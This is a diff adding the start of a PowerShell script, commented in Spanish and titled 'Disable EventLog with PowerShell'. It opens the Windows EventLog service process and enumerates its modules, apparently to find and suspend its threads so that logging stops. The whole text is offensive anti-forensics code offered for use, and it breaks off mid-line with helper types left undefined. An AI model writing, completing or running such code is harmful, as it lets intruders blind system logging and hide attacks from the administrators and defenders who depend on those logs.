@@ -1,0 +1,27 @@
+#Disable EventLog with PowerShell
+# Variables
+$MAXIMUM_ALLOWED = 0x02000000
+$TH32CS_SNAPTHREAD = 0x00000004
+$THREAD_QUERY_INFORMATION = 0x0040
+$THREAD_SUSPEND_RESUME = 0x0002
+$ntQueryInfoThreadClass = 9
+
+# Abrir el manejador del servicio EventLog
+$sc = Get-Service -Name 'EventLog'
+$servicePID = (Get-WmiObject -Query "SELECT ProcessId FROM Win32_Service WHERE Name='EventLog'").ProcessId
+$serviceProcessHandle = [Win32API]::OpenProcess($MAXIMUM_ALLOWED, $false, $servicePID)
+
+# Obtener los módulos cargados por svchost.exe
+$modules = New-Object IntPtr[] 256
+$modulesSizeNeeded = 0
+$moduleInfo = [MODULEINFO]::new()
+# Tamaño de los módulos
+$modulesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+$moduleCount = 0
+$remoteModuleName = New-Object char[] 128
+
+if ([Win32API]::EnumProcessModules($serviceProcessHandle, $modules, $modules.Length * $modulesSize, [ref]$modulesSizeNeeded)) {
+    $moduleCount = $modulesSizeNeeded / $modulesSize
+    for ($i = 0; $i -lt $moduleCount; $i++) {
+        $moduleHandle = $modules[$i]
+        $baseNameLength
